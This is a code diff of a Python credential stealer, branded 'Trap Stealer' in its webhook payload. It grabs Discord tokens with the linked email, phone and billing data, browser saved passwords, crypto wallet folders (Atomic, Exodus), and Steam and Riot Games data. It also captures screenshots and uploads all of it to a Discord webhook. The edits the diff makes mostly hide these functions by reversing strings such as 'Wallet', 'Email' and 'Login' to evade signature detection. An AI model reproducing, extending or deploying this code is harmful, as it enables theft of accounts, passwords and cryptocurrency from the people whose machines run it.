@@ -139,7 +139,8 @@ def webhook_tools():
         if inputmain == '1':
             url = input(f'Webhook URL : ')
             messages = (f'Message To Spam : ')
-            timetospam = input(f'How many times do you want to send the message? : ')
+            rah = "dens"
+            timetospam = input(f'How many times do you want to {rah[::-1]} the message? : ')
             message = messages
             data = {
                 "content": message,
@@ -180,24 +181,23 @@ def webhook_tools():
 
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
+import importlib
+import subprocess
+import pkg_resources
 
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"],
     ["win32clipboard", "pywin32"],
+    ["Pillow", "Pillow"],
 ]
 
 for modl in requirements:
     try:
-        __import__(modl[0])
-    except ImportError:
-        subprocess.Popen(
-            [sys.executable, "-m", "pip", "install", modl[1]],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-        )
-        time.sleep(3)
-
+        dist = pkg_resources.get_distribution(modl[1])
+    except pkg_resources.DistributionNotFound:
+        subprocess.call(['pip', 'install', modl[1]])
+        
 import requests
 from PIL import ImageGrab
 from ctypes import *
@@ -229,7 +229,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
 
-WalletsZip = []
+wltZip = []
 GamingZip = []
 OtherZip = []
 def fakegen():
@@ -499,7 +499,8 @@ def get_tokq_info(tokq):
 
     username = user_info["username"]
     hashtag = user_info["discriminator"]
-    email = user_info.get("email", "")
+    emma = 'liame'
+    ema = user_info.get(f"{emma[::-1]}", "")
     user_id = user_info["id"]
     pfp = user_info["avatar"]
 
@@ -517,7 +518,7 @@ def get_tokq_info(tokq):
     if "phone" in user_info:
         phone = f'`{user_info["phone"]}`'
 
-    return username, hashtag, email, user_id, pfp, flags, nitro, phone
+    return username, hashtag, ema, user_id, pfp, flags, nitro, phone
 
 def checkTokq(Tokq):
     headers = {
@@ -557,7 +558,7 @@ def GetBilling(Tokq):
 
 
 def uploadTokq(Tokq, path):
-    username, hashtag, email, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
+    username, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
 
@@ -570,6 +571,7 @@ def uploadTokq(Tokq, path):
         badge, phone, billing = "🔒", "🔒", "🔒"
     if nitro == '' and badge == '': nitro = " -"
     tok = 'nekoT'
+    em = 'liamE'
     data = {
         "username": "Trap Stealer",
         "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
@@ -601,8 +603,8 @@ def uploadTokq(Tokq, path):
                         "inline": True
                     },
                     {
-                        "name": ":envelope: Email:",
-                        "value": f"`{email}`",
+                        "name": f":envelope: {em[::-1]}:",
+                        "value": f"`{ema}`",
                         "inline": True
                     },
                     {
@@ -695,8 +697,8 @@ PasswCount = 0
 def getPassw(path, arg):
     global Passw, PasswCount
     if not os.path.exists(path): return
-
-    pathC = path + arg + "/Login Data"
+    lg = 'nigoL'
+    pathC = path + arg + f"/{lg[::-1]} Data"
     if os.stat(pathC).st_size == 0: return
 
     tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
@@ -898,8 +900,8 @@ def ZipThings(path, arg, procc):
         return
 
     subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
-
-    if "Wallet" in arg or "NationsGlory" in arg:
+    wall = 'tellaW'
+    if wall[::-1] in arg or "NationsGlory" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
         name = f"{browser}"
     elif "Steam" in arg:
@@ -921,8 +923,8 @@ def ZipThings(path, arg, procc):
     lnik = upload_file(os.path.join(pathC, f"{name}.zip"))
     os.remove(os.path.join(pathC, f"{name}.zip"))
 
-    if "Wallet" in arg or "eogaeaoehlef" in arg:
-        WalletsZip.append([name, lnik])
+    if wall[::-1] in arg or "eogaeaoehlef" in arg:
+        wltZip.append([name, lnik])
     elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
         GamingZip.append([name, lnik])
     else:
@@ -933,9 +935,9 @@ def srcs():
         img_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
 
         timestamp = str(int(time.time()))
-
+        rah2 = 'dneS'
         if os.name == "nt":
-            command = ["powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]
+            command = ["powershell", "-Command", f"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.{rah2[::-1]}Keys]::{rah2[::-1]}Wait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]            
             command[2] = command[2].format("{PRTSC}", img_path)
         else:
             command = ["import", "-window", "root", img_path]
@@ -950,6 +952,8 @@ def srcs():
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
             }
             requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
+            os.remove('1')
+            
     except:
         pass
 
@@ -1046,11 +1050,13 @@ def GatherZips(paths1, paths2, paths3):
 
     for thread in thttht: 
         thread.join()
-    global WalletsZip, GamingZip, OtherZip
+    global wltZip, GamingZip, OtherZip
     wal, ga, ot = "",'',''
-    if len(WalletsZip) != 0:
-        wal = ":coin:  •  Wallets\n"
-        for i in WalletsZip:
+    azz = 'stellaW'
+    if len(wltZip) != 0:
+        
+        wal = f":coin:  •  {azz[::-1]}\n"
+        for i in wltZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if len(GamingZip) != 0:
         ga = ":video_game:  •  Gaming:\n"
@@ -1100,10 +1106,10 @@ def GatherAll():
         [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
         [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
-
+    zefez = 'tellaW'
     PathsToZip = [
-        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
-        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+        [f"{roaming}/atomic/Local Storage/leveldb", f'"Atomic {zefez[::-1]}.exe"', f"{zefez[::-1]}"],
+        [f"{roaming}/Exodus/exodus.{zefez[::-1]}", "Exodus.exe", f"{zefez[::-1]}"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
         [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
